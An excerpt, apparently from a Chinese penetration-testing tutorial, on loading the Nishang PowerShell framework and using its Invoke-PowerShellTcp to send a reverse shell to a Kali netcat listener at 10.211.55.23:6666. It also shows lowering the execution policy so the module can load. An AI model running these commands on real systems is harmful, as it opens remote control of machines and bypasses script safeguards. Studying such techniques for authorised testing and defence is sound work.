# 3\. 模块加载

在官网文档中，启用的操作是这样的：

 `Import-Module .\nishang.psm1`

![](../Images/397b65c594abdd1a9317388b133542c7.png "null")

运行的时候提示 系统禁止运行脚本

这时候执行：

 `set-ExecutionPolicy RemoteSigned`

![](../Images/63b6d86c4eb8c2a67e06c0dd5eb54594.png "null")

提示需要以管理员的权限来运行`powershell`，那就用管理员权限启动：

![](../Images/763b419d94f753f05ac7f334c5b9b16a.png "null")![](../Images/8cc23db69580d4fab8003c745f739216.png "null")

初次导入，会有红色字的警告提示，如上图所示，是因为windows官方做的一个安全策略导致,再次使用 `set-ExecutionPolicy RemoteSigned`然后再次导入

`Import-Module .\nishang.psm1`

![](../Images/49bf16341023cf649bb107de17f4e373.png "null")

  

忽略警告即可！

## 4.6 反弹shell

```













Invoke-PowershellTcp -Reverse -IPAddress x.x.x.x -Port xxxx
```

在`kali`上进行如下监听： `nc -lvvp 6666`

![](../Images/8e983172e6cfefc8fca3fee73b993b0a.png "null")

反弹`shell`到`kali`上：

`Invoke-PowerShellTcp -Reverse -IPAddress 10.211.55.23 -Port 6666`

![](../Images/c407c9ae7780a7fbcf4d1999fd2c39f0.png "null")

  

反弹成功！
